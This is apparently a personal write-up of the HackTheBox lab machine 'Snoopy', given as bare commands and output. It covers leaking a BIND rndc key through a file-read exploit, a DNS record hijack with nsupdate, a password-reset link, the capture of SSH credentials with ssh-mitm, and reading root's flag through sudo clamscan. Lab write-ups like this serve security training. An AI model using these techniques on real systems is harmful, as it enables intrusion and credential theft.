---
layout: post
title: htb snoopy
date: 2023-05-09 22:26 +0200
hidden: true
---

```bash
┌──(rether㉿rether)-[~/]
└─$ ./exploit.sh /etc/bind/named.conf
Archive:  out.zip
// This is the primary configuration file for the BIND DNS server named.
//
// Please read /usr/share/doc/bind9/README.Debian.gz for information on the
// structure of BIND configuration files in Debian, *BEFORE* you customize
// this configuration file.
//
// If you are just adding zones, please do that in /etc/bind/named.conf.local

include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";

key "rndc-key" {
    algorithm hmac-sha256;
    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
```

```bash
nsupdate -d -y hmac-sha256:rndc-key:BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=
> server snoopy.htb
> update add mail.snoopy.htb.  86400  IN A 10.10.14.6
> send
```

Remove the `=` and `3D` character

http://mm.snoopy.htb/reset_password_complete?token=iw8t4bmbz93587bhacer5ph8ef7q3chdmow9rb3qtspd31zr8zu1zkya7kwjk74t


```
┌──(rether㉿rether)-[~/]
└─$ /snap/ssh-mitm/99/bin/ssh-mitm server --remote-host 10.10.11.212
─────────────────────────────────────── SSH-MITM - ssh audits made simple ────────────────────────────────────────
Version: 3.0.2
License: GNU General Public License v3.0
Documentation: https://docs.ssh-mitm.at
Issues: https://github.com/ssh-mitm/ssh-mitm/issues
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
generated temporary RSAKey key with 2048 bit length and fingerprints:
   MD5:b3:e6:05:c6:ab:ea:73:c9:7f:e2:15:79:44:a0:4e:a9
   SHA256:CA39ALBYLXscVqXkCkhQazU1GCzG5JFTKAGrdKBszF4
   SHA512:zIa3M/vwLKvk2O77xwhZDXHxXV45mKl1bXaV6wvyGM6IEWZbIUGxck/Hbxg+34zjzetcMHj4gRVyrQGrIzdC5A
listen interfaces 0.0.0.0 and :: on port 10022
──────────────────────────────────────────── waiting for connections ─────────────────────────────────────────────
[05/12/23 12:38:40] INFO     ℹ session 5426f190-c3bf-44c6-b874-a18a205cb169 created
                    INFO     ℹ client information:
                               - client version: ssh-2.0-paramiko_3.1.0
                               - product name: Paramiko
                               - vendor url:  https://www.paramiko.org/
                             ⚠ client audit tests:
                               * client uses same server_host_key_algorithms list for unknown and known hosts
                               * Preferred server host key algorithm: ssh-ed25519
[05/12/23 12:38:41] INFO     Remote authentication succeeded
                                     Remote Address: 10.10.11.212:22
                                     Username: cbrown
                                     Password: sn00pedcr3dential!!!
                                     Agent: no agent
```


```bash
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCfozGl8ZDqNfcHTJqtk6ZruTx7/+dXpSW9zUJ3/ItmB9lk//y3/duIcjK3yO3G1AxjDXlRglZzfNEyr/dQEVekM1VueeAU8r0Gs6gCKkjFIxL3Dd8GxvXENPcUyZ4tGX0AnlH0x0QJ9pXc0ahZ3C3e4ZFDEHhF29SocSvVZpWCmpI5dWIhcR8dUCw9tXlYxNIzkjo3I6rW9h6isqriVjDxjcHDPqeFSnGv0Cm+pDJXd7JJlG4oJO3ubQiAYxoC5oL5GsqD4Lf1fPKzd6mBiK39Pol/ETCT2zG5F8t87Tt2hjUxtJoud0XeJ2eqY0j4qlmskVccMwYaJ5QyXmEEgo/xZgnJWDazUA9DY26RuBvxJwvjVmyWyfSceFRfsRfQM/BZLXT+GpntBC1hSXj6yYX2nWGEs5Nu9IQ3nDMIbB7o3eYJdhorK2gFXZ15sW+NmPBg/GN28zv50djBdLIpQvoy5ASUxF0o8juHhnvM978MJgGwQVtm8VKOwoyXxehaRkk= cbrown@snoopy.htb
```


```bash
sudo /usr/local/bin/clamscan -f /root/root.txt
```
```bash
-f FILE, --file-list=FILE
    Scan files listed line by line in FILE.
```